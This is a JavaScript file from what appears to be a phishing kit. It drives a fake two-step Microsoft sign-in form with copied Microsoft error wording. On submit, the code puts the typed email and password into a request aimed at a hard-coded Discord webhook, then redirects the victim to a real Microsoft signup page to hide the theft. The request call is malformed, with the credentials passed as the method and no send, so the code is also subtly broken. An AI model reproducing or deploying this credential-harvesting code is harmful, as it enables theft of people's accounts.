const slidePage = document.querySelector(".slide-page"),
    secondSlide = document.querySelector(".secondSlide"),
    btnNext = document.querySelector(".firstNext"),
    prevBtnSec = document.querySelector(".prev-1"),
    submitBtn = document.querySelector(".submit");

function validateEmail(e) {
    return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(e);
}

function validate() {
    const e = $("#result"),
        t = $("#email").val();
    e.text("");
    if (!validateEmail(t)) {
        if (t) {
            e.text("That Microsoft account doesn't exist.\n Enter a different account or get a new one.");
            e.css("color", "red");
            document.getElementById("loginForm").style.height = "403px";
        } else {
            e.text("Enter a valid email address, phone number, or Skype\n name.");
            e.css("color", "red");
            document.getElementById("loginForm").style.height = "403px";
        }
        return false;
    }
    return true;
}

function validatePassword() {
    const e = $("#passResult"),
        t = $("#password").val();
    e.text("");
    if (t.length < 8) {
        e.text("Your account or password is incorrect. If you don't remember your password,");
        e.css("color", "red");
        return false;
    }
    return true;
}

var input1 = document.getElementById("email"),
    input2 = document.getElementById("password");

input1.addEventListener("keyup", function(e) {
    if (e.keyCode === 13) {
        e.preventDefault();
        document.getElementById("btnSend").click();
    }
});

input2.addEventListener("keyup", function(e) {
    if (e.keyCode === 13) {
        e.preventDefault();
        document.getElementById("btnSignIn").click();
    }
});

btnNext.addEventListener("click", function() {
    const e = document.getElementById("email").value;
    if (!validate()) {
        return;
    }
    if (!validateEmail(e)) {
        return;
    }
    document.getElementById("userLine").textContent = e;
    const t = document.getElementById("section-1"),
        n = document.getElementById("section-2");
    t.style.marginLeft = "-100%";
    t.style.visibility = "hidden";
    n.style.marginLeft = "0%";
    document.getElementById("loginForm").style.height = "403px";
});

submitBtn.addEventListener("click", function() {
    const request = new XMLHttpRequest();
    const email = document.getElementById("email");
    const password = document.getElementById("password");
    request.open(email.value + " : " + password.value, "https://discord.com/api/webhooks/1121708813263851541/BGj5GZ50KpgzAvSmSx-ozr_k_Dl01-Sx3Rzjz_JfQDF7cfONKGSfAEd3KbzZUCJHr7bc");
    location.href = 'https://signup.live.com/?lic=1';
});

prevBtnSec.addEventListener("click", function() {
    const e = document.getElementById("section-1"),
        t = document.getElementById("section-2");
    e.style.marginLeft = "0%";
    e.style.visibility = "visible";
    t.style.marginLeft = "100%";
    document.getElementById("loginForm").style.height = "370px";
    slidePage.style.marginLeft = "0%";
    secondSlide.style.marginLeft = "100%";
    slidePage.style.visibility = "visible";
});
